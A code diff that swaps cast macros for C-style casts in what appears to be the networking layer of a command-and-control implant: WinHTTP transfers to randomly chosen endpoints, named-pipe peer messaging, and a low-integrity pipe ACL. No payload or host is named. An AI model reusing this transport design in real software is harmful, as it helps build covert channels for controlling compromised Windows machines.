@@ -12,7 +12,7 @@ namespace Network {
             uint32_t length     = 0;
 
             do {
-                x_assert(Ctx->win32.WinHttpQueryDataAvailable(request, R_CAST(LPDWORD, &length)));
+                x_assert(Ctx->win32.WinHttpQueryDataAvailable(request, (DWORD*) &length));
 
                 if (!buffer) { buffer = x_malloc(length + 1); }
                 if (!download) {
@@ -23,7 +23,7 @@ namespace Network {
                 }
 
                 x_memset(buffer, 0, length + 1);
-                x_assert(Ctx->win32.WinHttpReadData(request, buffer, length, R_CAST(LPDWORD, &read)));
+                x_assert(Ctx->win32.WinHttpReadData(request, buffer, length, (DWORD*) &read));
 
                 x_memcpy(B_PTR(download) + total, buffer, read);
                 ZeroFreePtr(buffer, read);
@@ -32,9 +32,9 @@ namespace Network {
 
             } while (length > 0);
 
-            (*stream) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
-            (*stream)->buffer = B_PTR(download);
-            (*stream)->length = total;
+            (*stream)           = (_stream*) x_malloc(sizeof(_stream));
+            (*stream)->buffer   = B_PTR(download);
+            (*stream)->length   = total;
 
             defer:
         }
@@ -75,7 +75,7 @@ namespace Network {
             if (Ctx->transport.http->endpoints) {
                 RANDOM_SELECT(endpoint, Ctx->transport.http->endpoints);
 
-                req_ctx->endpoint = R_CAST(wchar_t*, x_malloc((x_wcslen(endpoint)+ 1) * sizeof(wchar_t)));
+                req_ctx->endpoint = (wchar_t*) x_malloc((x_wcslen(endpoint)+ 1) * sizeof(wchar_t));
                 x_memcpy(req_ctx->endpoint, endpoint, (x_wcslen(endpoint) + 1) * sizeof(wchar_t));
 
             }
@@ -204,7 +204,7 @@ namespace Network {
 
             x_assert(Ctx->win32.WinHttpSendRequest(req_ctx.req_handle, nullptr, 0, out->buffer, out->length, out->length, 0));
             x_assert(Ctx->win32.WinHttpReceiveResponse(req_ctx.req_handle, nullptr));
-            x_assert(Ctx->win32.WinHttpQueryHeaders(req_ctx.req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, R_CAST(LPDWORD, &n_status), nullptr));
+            x_assert(Ctx->win32.WinHttpQueryHeaders(req_ctx.req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, (DWORD*) &n_status, nullptr));
 
             if (status != HTTP_STATUS_OK) {
                 return_defer(status);
@@ -246,12 +246,12 @@ namespace Network {
 
             access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
             access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
-            access.Trustee.ptstrName    = S_CAST(LPSTR, SmbSecAttr->sid);
+            access.Trustee.ptstrName    = (LPSTR) SmbSecAttr->sid;
 
             x_assert(Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl));
             x_assert(Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->sid_low));
 
-            x_assert((SmbSecAttr->p_acl = S_CAST(PACL, x_malloc(MAX_PATH))));
+            x_assert((SmbSecAttr->p_acl = (PACL) x_malloc(MAX_PATH)));
 
             x_assert(Ctx->win32.InitializeAcl(SmbSecAttr->p_acl, MAX_PATH, ACL_REVISION_DS));
             x_assert(Ctx->win32.AddMandatoryAce(SmbSecAttr->p_acl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->sid_low));
@@ -277,7 +277,7 @@ namespace Network {
 
             do {
                 const auto length = MIN((in->length - total), PIPE_BUFFER_MAX);
-                if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, R_CAST(LPDWORD, &read), nullptr)) {
+                if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, (DWORD*) &read, nullptr)) {
                     if (ntstatus == ERROR_NO_DATA) {
                         return false;
                     }
@@ -296,7 +296,7 @@ namespace Network {
 
             do {
                 const auto length = MIN((out->length - total), PIPE_BUFFER_MAX);
-                if (!Ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, length, R_CAST(LPDWORD, &write), nullptr)) {
+                if (!Ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, length, (DWORD*) &write, nullptr)) {
                     return false;
                 }
 
@@ -345,16 +345,16 @@ namespace Network {
             uint32_t    msg_size   = 0;
             bool        success    = true;
 
-            if (Ctx->win32.PeekNamedPipe(Ctx->transport.pipe_handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
+            if (Ctx->win32.PeekNamedPipe(Ctx->transport.pipe_handle, nullptr, 0, nullptr, (DWORD*) &total, nullptr)) {
                 if (total > sizeof(uint32_t) * 2) {
 
-                    x_assert(Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &peer_id, sizeof(uint32_t), R_CAST(LPDWORD, &total), nullptr));
+                    x_assert(Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &peer_id, sizeof(uint32_t), (DWORD*) &total, nullptr));
 
                     if (Ctx->session.peer_id != peer_id) {
                         ntstatus = ERROR_INVALID_PARAMETER;
                         success_(false);
                     }
-                    if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &msg_size, sizeof(uint32_t), R_CAST(LPDWORD, &total), nullptr)) {
+                    if (!Ctx->win32.ReadFile(Ctx->transport.pipe_handle, &msg_size, sizeof(uint32_t), (DWORD*) &total, nullptr)) {
                         if (ntstatus != ERROR_MORE_DATA) {
                             success_(false);
                         }
